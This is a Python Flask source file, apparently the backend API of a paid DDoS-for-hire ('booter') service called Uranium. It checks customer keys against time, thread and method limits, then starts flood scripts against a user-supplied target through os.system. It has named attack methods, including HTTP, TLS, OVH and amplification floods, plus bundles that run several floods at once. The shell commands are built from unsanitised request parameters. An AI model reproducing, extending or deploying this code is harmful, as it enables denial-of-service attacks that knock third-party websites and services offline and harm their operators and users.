# URANIUM - SERVICES
from flask import Flask,request
import json,threading,socket,time,os,platform,string

app = Flask(__name__)

def read_keys(key_found):
 with open('login.json','r') as f:
   content = json.loads(f.read())
   keys = content['KEY'].keys()
   for key in keys:
    if key == key_found:return True
   return False

def query_keys(key_access,time,thread,methods):
 thread = int(thread)
 time = int(time)
 c = 0
 c2 = 0
 c3 = 0
 with open('login.json','r') as f:
   content = json.loads(f.read())
   keys = content['KEY']
   data = keys[key_access]
   t = data['TIME']
   th = data['THREAD']
   m = data['METHODS']
   if " " not in m and m == 'ALL':c3=1
   elif methods == m:c3=1
   else:
    raw_m = ''
    raw_meth = m.split(' ')
    for m2 in raw_meth:
     if m2 == methods:c3=1
     raw_m += m2 + '#'
    m = raw_m

   if int(t) == 0:c=1
   elif int(t) != 0 and time == int(t):c=1
   elif int(t) != 0 and int(t) > time:c=1

   if int(th) == 0:c2=1
   elif int(th) != 0 and thread == int(th):c2=1
   elif int(th) != 0 and int(th) > thread:c2=1
 return f'{c}:{t} {c2}:{th} {c3}:{m}'

def query_type(mode,layer_set=0,data2=''):
 with open('login.json','r') as f:
   content = json.loads(f.read())
   layer = content['CLASS']
   data = layer[f'L{layer_set}']
   if mode == 0:
    id = data['ID'].keys()
    id_raw = data['ID']
    for i in id:
     methods = id_raw[f'{i}']
     if data2 == methods:return i
    return False
   elif mode == 1:
    data_raw = data2.split(':')
    id = data['ID'].keys()
    id_raw = data['ID']
    raw_id = ''
    for i in id:
     methods = id_raw[f'{i}']
     if data_raw[1] == methods:raw_id = i
    if data_raw[0] == 'LINK':
     lst = data['LINK'].split(' ')
     for a in lst:
      if a == raw_id:return True
     return False
    else:
     lst = data['IP'].split(' ')
     for a in lst:
      if a == raw_id:return True
     return False

def flooder(IP,PORT,TIME,THREAD,METHOD,METHODS):
 path = ''
 if platform.system().lower() == 'windows':path = '\\'
 else:path = '/'
 if METHODS == 'HTTP-19':os.system(f'python3 METHODS{path}HTTP_19.py {IP} {PORT} 200 {TIME} {METHOD}')
 elif METHODS == 'HTTP-26':os.system(f'python3 METHODS{path}HTTP_26.py {IP} {PORT} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'HTTP-41':os.system(f'python3 METHODS{path}HTTP_41.py {IP} {PORT} {METHOD} {THREAD} {TIME}')
 elif METHODS == 'HTTP-84':os.system(f'python3 METHODS{path}HTTP_84.py OWN1 {IP} {PORT} {TIME} {TIME} 200 200 {METHOD} 1')
 elif METHODS == 'TLS':os.system(f'python3 METHODS{path}TLS.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'STRONG':os.system(f'python3 METHODS{path}STRONG.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'STRONG2':os.system(f'python3 METHODS{path}STRONG2.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'AMP-L7':os.system(f'python3 METHODS{path}AMP_L7.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'HANDSHAKE':os.system(f'python3 METHODS{path}HANDSHAKE.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'ORIGINAL-VISITOR':os.system(f'python3 METHODS{path}ORIGINAL_VISITOR.py {IP} {THREAD} {TIME} {METHOD} GOT.ms')
 elif METHODS == 'BIG-PACKET':os.system(f'python3 METHODS{path}BIG_PACKET.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'AUTH':os.system(f'python3 METHODS{path}AUTH.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'FORWARDED':os.system(f'python3 METHODS{path}FORWARDED.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'RAPID':os.system(f'python3 METHODS{path}RAPID.py {IP} {THREAD} {TIME} {METHOD}')
 elif METHODS == 'OVH-CONNECT':os.system(f'python3 METHODS{path}OVH_CONNECT.py {IP} {PORT} {THREAD} {TIME} 250')
 elif METHODS == 'OVH-RPS':os.system(f'python3 METHODS{path}OVH_RPS.py {IP} {PORT} {THREAD} {TIME} 250')
 elif METHODS == 'HTTP-HEX':os.system(f'python3 METHODS{path}HTTP_HEX.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
 elif METHODS == 'HTTP-LETTER':os.system(f'python3 METHODS{path}HTTP_LETTER.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
 elif METHODS == 'PPS':os.system(f'python3 METHODS{path}PPS.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
 elif METHODS == 'HTTP-RAP':os.system(f'python3 METHODS{path}HTTP_RAP.py {IP} {PORT} {TIME} {THREAD} 250 {METHOD}')
 elif METHODS == 'REQUEST-HELL':os.system(f'python3 METHODS{path}REQUEST_HELL.py {IP} {TIME} 0 0 {THREAD} 0')

@app.route('/target=<WEBSITE>&time=<NUM>&thread=<NUM2>&method=<METHODS>&key=<KEYS>')
def atk_http(WEBSITE,NUM,NUM2,METHODS,KEYS):
 if read_keys(KEYS) == True:
  raw = query_keys(KEYS,NUM,NUM2,METHODS).split(' ')
  t = raw[0].split(':')
  th = raw[1].split(':')
  m = raw[2].split(':')
  if int(t[0]) == 0:return f'Maximum time only - {t[1]}'
  if int(th[0]) == 0:return f'Maximum thread only - {th[1]}'
  if int(m[0]) == 0:return f'Support method only - {m[1].replace("#"," ")}.'
 else:
  return 'Keys not found . . .'
 PROTOCOL = request.headers.get("Protocol-Target")
 print(PROTOCOL)
 if query_type(mode=1,layer_set=7,data2=f'LINK:{METHODS}') == True:
  if PROTOCOL != 'https':PROTOCOL = 'https'
 DESTINATION = request.headers.get('Port-Target')
 if query_type(mode=1,layer_set=7,data2=f'IP:{METHODS}') == True:
  if DESTINATION == None or DESTINATION == '':DESTINATION = '80'
 if METHODS != 'OVH' and query_type(mode=1,layer_set=7,data2=f'IP:{METHODS}') == True or query_type(mode=1,layer_set=7,data2=f'LINK:{METHODS}') == True:
  METHOD = request.headers.get('Method-Http')
  if METHOD == None or METHOD == '':
   METHOD = 'GET'
 if query_type(mode=0,layer_set=7,data2=METHODS) == False:
   return 'METHODS NOT FOUND . . .'
 else:
  if METHODS == 'HTTP-170':
   meth = ['HTTP-19','HTTP-26','HTTP-41','HTTP-84']
   for m2 in meth:
    threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,m2)).start()
  elif METHODS == 'HTTP-ALL':
   meth = ['HTTP-19','HTTP-26','HTTP-41','HTTP-84','HTTP-HEX','OVH-RPS','OVH-CONNECT','PPS','HTTP-LETTER','HTTP-RAP']
   for m2 in meth:
    threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,m2)).start()
  elif METHODS == 'HTTP-OHIO':
   meth = ['HTTP-HEX','PPS','HTTP-LETTER','HTTP-RAP']
   for m2 in meth:
    threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,m2)).start()
  elif METHODS == 'OVH-ALL':
   meth = ['OVH-RPS','OVH-CONNECT']
   for m2 in meth:
    threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,m2)).start()
  else:
   if query_type(mode=1,layer_set=7,data2=f'LINK:{METHODS}') == True:
    WEBSITE = PROTOCOL+'://'+WEBSITE+'/'
    threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,METHODS)).start()
   else:
    threading.Thread(target=flooder,args=(WEBSITE,DESTINATION,NUM,NUM2,METHOD,METHODS)).start()
  return f"PROTOCOL={query_type(mode=1,layer_set=7,data2=f'LINK:{METHODS}')}:{PROTOCOL} PORT={query_type(mode=1,layer_set=7,data2=f'IP:{METHODS}')}:{DESTINATION} METHODS={METHODS}:{query_type(mode=0,layer_set=7,data2=METHODS)} WITH {METHOD} ---> {WEBSITE} TIME={NUM} THREAD={NUM2} BY {KEYS}",200

def checking():
 time.sleep(5)
 try:
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('127.0.0.1',5000))
 except:threading.Thread(target=app.run('0.0.0.0',5000)).start()
 threading.Thread(target=checking).start()

threading.Thread(target=checking).start()